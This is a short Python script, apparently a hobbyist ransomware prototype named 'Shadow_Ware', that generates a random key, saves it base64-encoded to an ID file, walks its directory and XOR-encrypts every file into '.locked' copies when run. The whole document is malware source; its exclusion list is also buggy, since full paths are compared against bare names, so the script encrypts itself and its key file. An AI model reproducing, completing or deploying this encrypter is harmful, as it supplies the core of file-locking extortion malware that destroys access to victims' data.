import base64, random, os, hashlib, hmac

""" Class for encrypter """
class Shadow_Ware():
  def __init__(self):
    self.ignored_files = [
      "ID.id",
      "encrypter.py",
      ".git",
      'hooks', 'refs', 'info', 'lfs', 'logs', 'objects', 'branches', 'remotes', 'heads', 'tags', 'origin', 'tmp', 'refs', 'remotes', 'heads', 'origin', 'pack', 'info'  
    ]

    # Keys and ID
    self.key = self.get_key()
    self.bytes_key = self.turn_to_bytes(self.key)
    self.create_id()

    # Current Dir
    self.current_dir = os.path.dirname(__file__)

    # Print files
    print(self.get_file_in_dir(self.current_dir))
    print(self.get_dir_in_dir(self.current_dir))

  # Inital code to setup data used for encyrption
  def get_key(self):
    key = ""
    for _ in range(random.randint(30, 40)):
      key += str(random.randint(1, 99))
    return key

  def turn_to_bytes(self, string):
    return string.encode("utf-8")

  def create_id(self):
    with open("ID.id", "wb") as ID_file:
      ID_file.write(base64.b64encode(self.turn_to_bytes(self.key)))

  # Get all files 
  def get_file_in_dir(self, dir):
    files = []
    for file in os.listdir(dir):
      if file not in self.ignored_files:
        files.append(file)
    return files

  def get_dir_in_dir(self, dir):
    directories = []
    for root, dirs, files in os.walk(dir):
      for directory in dirs:
        if directory not in self.ignored_files:
          directories.append(directory)
    return directories

  def get_all_files(self, dir):
    all_files = []
    for root, dirs, files in os.walk(dir):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path not in self.ignored_files:
                all_files.append(file_path)
    return all_files

  # Encryption code
  def encrypt_file(self, input_file, output_file):
    with open(input_file, "rb") as file:
        data = file.read()

    encrypted_data = bytearray(len(data))
    for i in range(len(data)):
        encrypted_data[i] = data[i] ^ self.bytes_key[i % len(self.bytes_key)]

    with open(output_file, "wb") as file:
        file.write(encrypted_data)

  # Encrypt All Files
  def encrypt_all_files(self):
    files = self.get_all_files(self.current_dir)
    for file in files:
      self.encrypt_file(file, file + ".locked")

if __name__ == "__main__":
  shadow_ware = Shadow_Ware()
  shadow_ware.encrypt_all_files()
